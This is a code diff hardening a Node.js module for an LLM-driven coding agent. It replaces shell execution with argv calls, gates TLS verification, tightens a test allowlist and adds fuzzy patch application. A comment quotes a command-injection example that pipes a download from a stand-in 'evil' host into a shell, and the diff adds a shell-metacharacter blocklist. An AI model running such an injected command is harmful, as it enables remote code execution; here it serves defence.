@@ -12,12 +12,15 @@
 
 const fs = require("fs");
 const path = require("path");
-const { execSync, execFileSync } = require("child_process");
+const { execFileSync } = require("child_process");
+const { tokenizeCommand, safeExec } = require("./safe-exec");
 const https = require("https");
 
-// Node's built-in CA bundle sometimes can't verify API provider certs on Windows.
-// The API key in the Authorization header is the real auth mechanism here.
-const llmAgent = new https.Agent({ rejectUnauthorized: false });
+// TLS-verification gate is centralized in lib/insecure-tls.js so all three LLM-call
+// sites share one source of truth — insecure ONLY on Windows or with an explicit
+// LANTERN_INSECURE_TLS=1, never unconditionally (the response here is applied as a
+// code diff, so an MITM would be RCE). #869
+const { llmAgent } = require("./insecure-tls");
 
 const MAX_OUTPUT = 8000;
 const MAX_DIFF_SIZE = 128000;
@@ -140,47 +143,67 @@ function validateDiff(diffText, repoRoot) {
 
 // ── Diff application ────────────────────────────────────────────────────
 
-function applyHunk(lines, hunk) {
-  const result = [...lines];
-  const insertIndex = hunk.oldStart - 1;
-  let contextCount = 0;
-  let removeCount = 0;
-  let addCount = 0;
-  for (const l of hunk.lines) {
-    if (l.startsWith("-")) removeCount++;
-    else if (l.startsWith("+")) addCount++;
-    else if (l.startsWith(" ")) contextCount++;
-  }
-  if (contextCount + removeCount !== hunk.oldCount) {
-    throw new Error(`hunk_old_count_mismatch: expected ${hunk.oldCount}, got ${contextCount + removeCount}`);
-  }
-  if (contextCount + addCount !== hunk.newCount) {
-    throw new Error(`hunk_new_count_mismatch: expected ${hunk.newCount}, got ${contextCount + addCount}`);
-  }
-
-  // Remove old lines
-  let removed = 0;
-  for (const l of hunk.lines) {
-    if (l.startsWith("-")) {
-      const expected = l.slice(1);
-      const actual = result[insertIndex + removed];
-      if (actual !== expected) {
-        throw new Error(`hunk_content_mismatch at line ${insertIndex + removed + 1}: expected "${expected}", got "${actual}"`);
-      }
-      result.splice(insertIndex + removed, 1);
-    } else if (l.startsWith("+")) {
-      result.splice(insertIndex + removed, 0, l.slice(1));
-      removed++;
-    } else if (l.startsWith(" ")) {
-      const expected = l.slice(1);
-      const actual = result[insertIndex + removed];
-      if (actual !== expected) {
-        throw new Error(`hunk_context_mismatch at line ${insertIndex + removed + 1}: expected "${expected}", got "${actual}"`);
-      }
-      removed++;
+// Split a hunk into its "before" (context + removed) and "after" (context +
+// added) line arrays, ignoring the @@ header counts — LLM diffs routinely get
+// them wrong — and "\ No newline at end of file" markers.
+function hunkBlocks(hunk) {
+  const before = [];
+  const after = [];
+  // Drop trailing blank lines: a diff that ends with a newline parses into a
+  // spurious "" hunk line that is not real content (an interior blank context
+  // line arrives as " " or, from some generators, as a bare "").
+  let end = hunk.lines.length;
+  while (end > 0 && hunk.lines[end - 1] === "") end--;
+  for (let i = 0; i < end; i++) {
+    const l = hunk.lines[i];
+    const tag = l[0];
+    if (tag === "+") after.push(l.slice(1));
+    else if (tag === "-") before.push(l.slice(1));
+    else if (tag === "\\") continue; // "\ No newline at end of file"
+    else {
+      // context line (" foo"), or a bare blank line some generators emit as ""
+      const text = l.startsWith(" ") ? l.slice(1) : l;
+      before.push(text);
+      after.push(text);
     }
   }
-  return result;
+  return { before, after };
+}
+
+// Find where the `before` block sits in `lines`, preferring the position
+// closest to `hint`. Exact pass first, then a whitespace-normalized pass so
+// indentation / trailing-space drift still lands. Returns start index, or -1.
+function locateBlock(lines, before, hint) {
+  const n = lines.length;
+  const m = before.length;
+  if (m === 0) return Math.min(Math.max(hint, 0), n); // pure insertion
+  if (m > n) return -1;
+  const starts = [];
+  for (let i = 0; i + m <= n; i++) starts.push(i);
+  starts.sort((a, b) => Math.abs(a - hint) - Math.abs(b - hint) || a - b);
+  const matches = (start, eq) => {
+    for (let j = 0; j < m; j++) if (!eq(lines[start + j], before[j])) return false;
+    return true;
+  };
+  for (const s of starts) if (matches(s, (a, b) => a === b)) return s;
+  for (const s of starts) if (matches(s, (a, b) => a.trim() === b.trim())) return s;
+  return -1;
+}
+
+// Apply one hunk by locating its context in the file rather than trusting the
+// (often-wrong) @@ line numbers. Fuzzy: tolerant of header-count drift, line
+// drift, and whitespace differences — the failure modes of LLM-authored diffs.
+function applyHunkFuzzy(lines, hunk) {
+  const { before, after } = hunkBlocks(hunk);
+  if (before.length === 0) {
+    const at = Math.min(Math.max(hunk.oldStart - 1, 0), lines.length);
+    return [...lines.slice(0, at), ...after, ...lines.slice(at)];
+  }
+  const pos = locateBlock(lines, before, hunk.oldStart - 1);
+  if (pos < 0) {
+    throw new Error(`hunk_not_located: ${before.length}-line context near line ${hunk.oldStart} not found`);
+  }
+  return [...lines.slice(0, pos), ...after, ...lines.slice(pos + before.length)];
 }
 
 // Targets of a parsed diff, as repo-relative paths, tagged created vs changed.
@@ -195,7 +218,11 @@ function diffTargets(files) {
   return out;
 }
 
-// Strict, dependency-free applier (exact context match). Used as a fallback.
+// In-process, dependency-free fallback applier. Fuzzy: it locates each hunk by
+// content (whitespace-tolerant) instead of trusting the diff's line numbers, so
+// it lands LLM-authored diffs that git apply and an exact-match applier reject.
+// Hunks apply high-line-first so a later hunk can't shift an earlier one's index;
+// the file's EOL and trailing newline are preserved.
 function applyPatchStrict(repoRoot, files) {
   const stats = { changed: [], created: [], errors: [] };
   for (const f of files) {
@@ -203,15 +230,20 @@ function applyPatchStrict(repoRoot, files) {
     if (!target || target === "/dev/null") continue;
     target = target.replace(/^(a|b)\//, "");
     const fullPath = path.join(repoRoot, target);
-    let lines = [];
-    if (fs.existsSync(fullPath)) lines = fs.readFileSync(fullPath, "utf8").split(/\r?\n/);
+    const existed = fs.existsSync(fullPath);
+    const raw = existed ? fs.readFileSync(fullPath, "utf8") : "";
+    const eol = /\r\n/.test(raw) ? "\r\n" : "\n";
+    const trailingNewline = /\n$/.test(raw);
+    let lines = raw.length ? raw.split(/\r?\n/) : [];
+    if (trailingNewline && lines[lines.length - 1] === "") lines.pop();
     try {
       let working = lines;
-      for (let hi = f.hunks.length - 1; hi >= 0; hi--) working = applyHunk(working, f.hunks[hi]);
+      const hunks = [...f.hunks].sort((a, b) => b.oldStart - a.oldStart);
+      for (const h of hunks) working = applyHunkFuzzy(working, h);
       const dir = path.dirname(fullPath);
       if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
-      fs.writeFileSync(fullPath, working.join("\n"), "utf8");
-      if (lines.length === 0 && f.hunks.length > 0) stats.created.push(target);
+      fs.writeFileSync(fullPath, working.join(eol) + (trailingNewline || !existed ? eol : ""), "utf8");
+      if (!existed && f.hunks.length > 0) stats.created.push(target);
       else stats.changed.push(target);
     } catch (err) {
       stats.errors.push({ file: target, error: err.message });
@@ -266,11 +298,11 @@ function resolveDiffPaths(repoRoot, diffText, files) {
 }
 
 // Apply a unified diff. LLM-generated diffs almost always have line-number drift
-// and minor context fuzz, which a strict exact-match applier rejects (→ the patch
-// never lands → autowork can't actually complete issues). We use git's robust
-// applier first (with recount/fuzz/3way), and fall back to the strict applier
-// only if git is unavailable. validateDiff still gates format + path safety, and
-// the caller's anti-fraud gate still rejects empty/errored results.
+// and minor context fuzz. We try git's robust applier first (recount/fuzz/3way),
+// and fall back to an in-process *fuzzy* applier (content-located, whitespace-
+// tolerant) that lands diffs git apply rejects — without it the patch never
+// lands and autowork can't complete issues. validateDiff still gates format +
+// path safety, and the caller's anti-fraud gate still rejects empty/errored results.
 function applyPatch(repoRoot, diffText) {
   let files = validateDiff(diffText, repoRoot);
   // Repair dropped-prefix paths (e.g. ouro_serve.py -> scripts/ouro_serve.py) so the
@@ -314,7 +346,7 @@ function applyPatch(repoRoot, diffText) {
     };
   }
 
-  // git apply rejected the diff — fall back to the strict applier (exact match).
+  // git apply rejected the diff — fall back to the in-process fuzzy applier.
   const strict = applyPatchStrict(repoRoot, files);
   strict.applier = "strict";
   strict.pathRewrites = pathRewrites;
@@ -325,7 +357,7 @@ function applyPatch(repoRoot, diffText) {
 // ── Git operations ──────────────────────────────────────────────────────
 
 function gitCurrentBranch(repoRoot) {
-  return execSync("git branch --show-current", { cwd: repoRoot, encoding: "utf8", timeout: 5000 }).trim();
+  return safeExec(["git", "branch", "--show-current"], { cwd: repoRoot, encoding: "utf8", timeout: 5000 }).trim();
 }
 
 // Guard against clobbering in-progress work. This automation operates on the
@@ -334,7 +366,7 @@ function gitCurrentBranch(repoRoot) {
 // modified — and a stray staged file would also leak into the next commit.
 // Refuse the switch when the tree is dirty rather than destroy that work.
 function gitEnsureClean(repoRoot) {
-  const dirty = execSync("git status --porcelain", { cwd: repoRoot, encoding: "utf8", timeout: 5000 }).trim();
+  const dirty = safeExec(["git", "status", "--porcelain"], { cwd: repoRoot, encoding: "utf8", timeout: 5000 }).trim();
   if (dirty) {
     const n = dirty.split("\n").length;
     throw new Error(
@@ -348,13 +380,15 @@ function gitEnsureClean(repoRoot) {
 function gitCreateBranch(repoRoot, branchName) {
   const safe = sanitizeBranchName(branchName);
   gitEnsureClean(repoRoot);
-  execSync(`git checkout -b ${safe}`, { cwd: repoRoot, encoding: "utf8", timeout: 10000 });
+  safeExec(["git", "checkout", "-b", safe], { cwd: repoRoot, encoding: "utf8", timeout: 10000 });
   return safe;
 }
 
 function gitCommit(repoRoot, message) {
-  const safeMsg = String(message || "auto commit").replace(/"/g, "'").slice(0, 200);
-  execSync(`git commit -m "${safeMsg}"`, {
+  // No shell: the message is a discrete argv entry, so quotes / $(…) / backticks
+  // can no longer inject (the old `"`→`'` strip didn't stop command substitution).
+  const safeMsg = String(message || "auto commit").slice(0, 200);
+  safeExec(["git", "commit", "-m", safeMsg], {
     cwd: repoRoot,
     encoding: "utf8",
     timeout: 10000,
@@ -367,7 +401,7 @@ function gitPush(repoRoot, targetBranch) {
   // slash gets stripped and the name doubles (auto/foo → auto/autofoo).
   if (!targetBranch.startsWith("auto/")) throw new Error("invalid_branch_prefix");
   // Use HEAD:ref so we don't need to rename the local branch first.
-  execSync(`git push origin HEAD:${targetBranch}`, {
+  safeExec(["git", "push", "origin", `HEAD:${targetBranch}`], {
     cwd: repoRoot,
     encoding: "utf8",
     timeout: 30000,
@@ -377,11 +411,11 @@ function gitPush(repoRoot, targetBranch) {
 }
 
 function gitDiffStat(repoRoot) {
-  return execSync("git diff --stat", { cwd: repoRoot, encoding: "utf8", timeout: 5000 }).trim();
+  return safeExec(["git", "diff", "--stat"], { cwd: repoRoot, encoding: "utf8", timeout: 5000 }).trim();
 }
 
 function gitAddAll(repoRoot) {
-  execSync("git add -A", { cwd: repoRoot, encoding: "utf8", timeout: 5000 });
+  safeExec(["git", "add", "-A"], { cwd: repoRoot, encoding: "utf8", timeout: 5000 });
 }
 
 // Stage ONLY the given files. Critical anti-fraud measure: autowork must never
@@ -453,13 +487,37 @@ const ALLOWED_TESTS = [
   /^node tests\/test_dream_journal_keystone\.js$/,
   /^node tests\/test_dream_chat_self_edit\.js$/,
   /^node tests\/test_convergance_routing\.js$/,
-  /^python -m pytest tests\/(.+)\.py$/,
+  // Closed character class (no shell metachars) — the greedy `(.+)` here was an
+  // injection surface: `python -m pytest tests/x;curl evil|sh.py` matched. #873
+  /^python -m pytest tests\/[\w./-]+\.py$/,
   /^npm test$/,
   /^npm run test$/,
 ];
 
 function isAllowedTest(cmd) {
   return ALLOWED_TESTS.some((re) => re.test(cmd));
+}
+
+// Shell metacharacters that must never reach an executed command. The allowlist
+// regexes already exclude them; this is the second, no-shell layer. #873
+const SHELL_META = /[;&|$`(){}<>\n\r\\"'*?~]/;
+const ALLOWED_TEST_BINS = new Set(["node", "python", "npm", "npx"]);
+
+// Split an allowlisted command into argv with NO shell involvement, rejecting any
+// token bearing a shell metacharacter. Returns argv; throws on an unsafe token.
+function tokenizeAllowedCommand(cmd) {
+  const argv = String(cmd).trim().split(/ +/);
+  for (const t of argv) {
+    if (!t || SHELL_META.test(t)) throw new Error("unsafe_command_token");
+  }
+  return argv;
+}
+
+function resolveAllowedTestBinary(bin) {
+  const normalized = String(bin || "").trim();
+  if (!ALLOWED_TEST_BINS.has(normalized)) throw new Error("unsafe_command_bin");
+  if (process.platform === "win32" && (normalized === "npm" || normalized === "npx")) return normalized + ".cmd";
+  return normalized;
 }
 
 // opts.env overrides the child environment — used to point NODE_PATH at the main
@@ -472,8 +530,17 @@ function runTests(repoRoot, testCommands, opts = {}) {
       results.push({ cmd, ok: false, error: "test_not_allowlisted", output: "" });
       continue;
     }
+    let argv;
+    let bin;
     try {
-      const out = execSync(cmd, { cwd: repoRoot, encoding: "utf8", timeout: 60000, maxBuffer: 1024 * 1024, env });
+      argv = tokenizeAllowedCommand(cmd);
+      bin = resolveAllowedTestBinary(argv[0]);
+    } catch {
+      results.push({ cmd, ok: false, error: "test_command_unsafe", output: "" });
+      continue;
+    }
+    try {
+      const out = execFileSync(bin, argv.slice(1), { cwd: repoRoot, encoding: "utf8", timeout: 60000, maxBuffer: 1024 * 1024, env, shell: false });
       results.push({ cmd, ok: true, output: out.slice(0, MAX_OUTPUT), truncated: out.length > MAX_OUTPUT });
     } catch (err) {
       results.push({
@@ -682,26 +749,82 @@ function callOllama(messages) {
 
 // ── JSON extraction (resilient against markdown fences + preamble) ───────
 
+// Parse JSON, tolerating the usual LLM-JSON sins (// and /* */ comments,
+// trailing commas). Returns undefined on failure (JSON.parse never yields
+// undefined, so it is a safe "no result" sentinel).
+function tryParseLoose(text) {
+  if (!text || typeof text !== "string") return undefined;
+  const t = text.trim();
+  if (!t) return undefined;
+  try { return JSON.parse(t); } catch {}
+  const cleaned = t
+    .replace(/\/\*[\s\S]*?\*\//g, "")            // /* block comments */
+    .replace(/(^|[^:"'\\])\/\/[^\n\r]*/g, "$1")  // // line comments (not http://)
+    .replace(/,(\s*[}\]])/g, "$1");              // trailing commas
+  try { return JSON.parse(cleaned); } catch {}
+  return undefined;
+}
+
+// Best-effort repair of a truncated / imbalanced object or array: close an
+// unterminated string, drop a dangling comma, and balance the open {/[ that
+// the model never closed (it got cut off mid-JSON).
+function repairJson(text) {
+  let t = String(text)
+    .replace(/\/\*[\s\S]*?\*\//g, "")
+    .replace(/,(\s*[}\]])/g, "$1");
+  const stack = [];
+  let inStr = false, esc = false;
+  for (let i = 0; i < t.length; i++) {
+    const ch = t[i];
+    if (inStr) {
+      if (esc) esc = false;
+      else if (ch === "\\") esc = true;
+      else if (ch === '"') inStr = false;
+      continue;
+    }
+    if (ch === '"') inStr = true;
+    else if (ch === "{" || ch === "[") stack.push(ch);
+    else if (ch === "}" || ch === "]") stack.pop();
+  }
+  if (inStr) t += '"';
+  t = t.replace(/,\s*$/, "");
+  for (let i = stack.length - 1; i >= 0; i--) t += stack[i] === "{" ? "}" : "]";
+  return t;
+}
+
+// Resilient against markdown fences (with or without a closing fence),
+// preamble/commentary, comments, trailing commas, and truncated output.
 function extractJson(raw) {
   if (!raw || typeof raw !== "string") throw new Error("empty response");
-  // 1. Try direct parse first
   const trimmed = raw.trim();
-  try { return JSON.parse(trimmed); } catch {}
-  // 2. Strip ```json ... ``` or ``` ... ``` fences
-  const fenceMatch = trimmed.match(/```(?:json)?\s*\n?([\s\S]*?)\n?```/);
-  if (fenceMatch) { try { return JSON.parse(fenceMatch[1].trim()); } catch {} }
-  // 3. Find first { and last } to extract embedded JSON object
-  const start = trimmed.indexOf("{");
-  const end = trimmed.lastIndexOf("}");
-  if (start !== -1 && end > start) {
-    try { return JSON.parse(trimmed.slice(start, end + 1)); } catch {}
+
+  const candidates = [trimmed];
+  // ```json … ``` (or ``` … ```) with a closing fence
+  const fenceMatch = trimmed.match(/```(?:json)?\s*\n?([\s\S]*?)\n?```/i);
+  if (fenceMatch) candidates.push(fenceMatch[1]);
+  // a LONE opening fence with no closing one (truncated / sloppy models)
+  if (/^```/.test(trimmed)) {
+    candidates.push(trimmed.replace(/^```(?:json)?[^\n]*\n?/i, "").replace(/```\s*$/i, ""));
   }
-  // 4. Find first [ and last ] for array responses
-  const aStart = trimmed.indexOf("[");
-  const aEnd = trimmed.lastIndexOf("]");
-  if (aStart !== -1 && aEnd > aStart) {
-    try { return JSON.parse(trimmed.slice(aStart, aEnd + 1)); } catch {}
+  // first { … last }  and  first [ … last ]
+  const oStart = trimmed.indexOf("{"), oEnd = trimmed.lastIndexOf("}");
+  if (oStart !== -1 && oEnd > oStart) candidates.push(trimmed.slice(oStart, oEnd + 1));
+  const aStart = trimmed.indexOf("["), aEnd = trimmed.lastIndexOf("]");
+  if (aStart !== -1 && aEnd > aStart) candidates.push(trimmed.slice(aStart, aEnd + 1));
+
+  for (const c of candidates) {
+    const parsed = tryParseLoose(c);
+    if (parsed !== undefined) return parsed;
   }
+
+  // Last resort: repair a truncated object/array from its first opener.
+  const opener = oStart !== -1 ? oStart : aStart;
+  if (opener !== -1) {
+    const body = trimmed.slice(opener).replace(/```\s*$/i, "");
+    const parsed = tryParseLoose(repairJson(body));
+    if (parsed !== undefined) return parsed;
+  }
+
   throw new Error("no valid JSON found in model response");
 }
 
@@ -740,12 +863,20 @@ async function generatePlan(repoRoot, userRequest, scopeFiles, history) {
 
   const userPrompt = `${historyContext}User request: ${userRequest}\n\nRelevant files:\n${fileContext || "(none specified — infer from request)"}\n\nProduce the JSON plan.`;
 
-  const raw = await callLlm(PLAN_SYSTEM_PROMPT, userPrompt, "auto");
-  let plan;
-  try {
-    plan = extractJson(raw);
-  } catch (e) {
-    throw new Error("plan_parse_failed: " + e.message + " | raw=" + raw.slice(0, 300));
+  // Generate + parse with one retry: models intermittently wrap the JSON in a
+  // code fence, add a trailing comma, or get cut off. extractJson recovers most
+  // of that; the retry re-asks with a stricter reminder for the rest.
+  let plan, raw = "", lastErr;
+  for (let attempt = 1; attempt <= 2; attempt++) {
+    const sys = attempt === 1
+      ? PLAN_SYSTEM_PROMPT
+      : PLAN_SYSTEM_PROMPT + "\n\nIMPORTANT: your previous reply could not be parsed as JSON. " +
+        "Reply with ONLY the raw JSON object — no code fences, no comments, no trailing commas — and make sure it is complete.";
+    raw = await callLlm(sys, userPrompt, "auto");
+    try { plan = extractJson(raw); break; } catch (e) { lastErr = e; }
+  }
+  if (!plan) {
+    throw new Error("plan_parse_failed: " + (lastErr ? lastErr.message : "unknown") + " | raw=" + raw.slice(0, 300));
   }
 
   // Validate plan structure
@@ -821,12 +952,95 @@ async function generatePatch(repoRoot, plan, opts = {}) {
 
 // ── Module exports ────────────────────────────────────────────────────────
 
+// ── Already-implemented preflight ─────────────────────────────────────────
+// Cheap git-only check: has this issue's fix already landed? Open-but-fixed
+// issues are the #1 cause of wasted autowork runs — the loop regenerates a
+// stale diff, then aborts at the apply gate. We look for two signals on the
+// current checkout: (a) the issue number cited in a code comment/string, and
+// (b) a commit message referencing the issue. Either is treated as "likely
+// already implemented"; the caller surfaces the citation and skips unless the
+// run is forced. Heuristic by design — it errs toward surfacing, not blocking.
+function detectAlreadyImplemented(repoRoot, issueNumber, opts = {}) {
+  const n = String(issueNumber).replace(/[^0-9]/g, "");
+  // #942: ground the preflight on the SERVING state (origin/master) — not the
+  // local checkout's HEAD, which can be a stale feature branch that misses
+  // already-landed fixes. Best-effort fetch keeps origin/master current; if the
+  // ref can't be resolved we fall back to HEAD so the function still works offline.
+  let baseRef = opts.baseRef || "origin/master";
+  const empty = { implemented: false, citations: [], commits: [], ref: baseRef };
+  if (!n) return empty;
+
+  const runGit = (args) => {
+    try {
+      return execFileSync("git", args, {
+        cwd: repoRoot, encoding: "utf8", timeout: 15000, windowsHide: true,
+      });
+    } catch (e) {
+      // git grep exits 1 when there are no matches — that's "not found", not a
+      // failure. Salvage any stdout; treat everything else as no matches.
+      return e && e.stdout ? String(e.stdout) : "";
+    }
+  };
+
+  // Refresh + verify the base ref; fall back to HEAD if origin/master is absent.
+  try {
+    execFileSync("git", ["fetch", "origin", "master", "--quiet"], {
+      cwd: repoRoot, encoding: "utf8", timeout: 20000, windowsHide: true,
+    });
+  } catch (_e) { /* offline / no remote — use whatever origin/master we have */ }
+  try {
+    execFileSync("git", ["rev-parse", "--verify", "--quiet", baseRef], {
+      cwd: repoRoot, encoding: "utf8", timeout: 5000, windowsHide: true,
+    });
+  } catch (_e) { baseRef = "HEAD"; }
+
+  // (a) Code citations: an issue ref in a comment/string ("issue NNN",
+  // "issues/NNN", or a hash-prefixed number) — bounded so a longer number can't
+  // match a shorter one. Restricted to source files so docs/handoffs/changelog
+  // (which mention issues without implementing them) don't trigger false hits.
+  const pattern = `(#|issues?/|issue[ #]+)0*${n}([^0-9]|$)`;
+  const citations = [];
+  const grepOut = runGit([
+    "grep", "-n", "-E", "-I", "-i", pattern, baseRef, "--",
+    "*.js", "*.mjs", "*.cjs", "*.ts", "*.py", "*.ps1", "*.sh",
+    ":(exclude)**/node_modules/**",
+  ]);
+  // git grep against a TREE (origin/master/HEAD) prefixes each hit with "<ref>:"
+  // — strip it so the "file:line:" parse works the same as a working-tree grep (#942).
+  const refPrefix = baseRef + ":";
+  for (const raw of grepOut.split(/\r?\n/)) {
+    const line = raw.startsWith(refPrefix) ? raw.slice(refPrefix.length) : raw;
+    const m = line.match(/^([^:]+):(\d+):/);
+    if (m) citations.push({ file: m[1].replace(/\\/g, "/"), line: Number(m[2]) });
+    if (citations.length >= 10) break;
+  }
+
+  // (b) Commit messages referencing the issue (a "fixes"/"closes" hash ref).
+  const commits = [];
+  const logOut = runGit([
+    "log", "-E", "--grep", `#${n}\\b`, "--pretty=format:%h %s", "-n", "10", baseRef,
+  ]);
+  for (const line of logOut.split(/\r?\n/)) {
+    const t = line.trim();
+    if (t) commits.push(t);
+  }
+
+  return {
+    implemented: citations.length > 0 || commits.length > 0,
+    citations,
+    commits,
+    ref: baseRef,
+  };
+}
+
 module.exports = {
   isPathSafe,
+  detectAlreadyImplemented,
   sanitizeBranchName,
   parseUnifiedDiff,
   validateDiff,
   applyPatch,
+  applyPatchStrict,
   gitCreateBranch,
   gitEnsureClean,
   gitCommit,
@@ -838,9 +1052,11 @@ module.exports = {
   openDraftPr,
   runTests,
   generatePlan,
+  extractJson,
   generatePatch,
   callLlm,
   isAllowedTest,
+  tokenizeAllowedCommand,
   requireSafePaths,
   resolveRepoPath,
 };
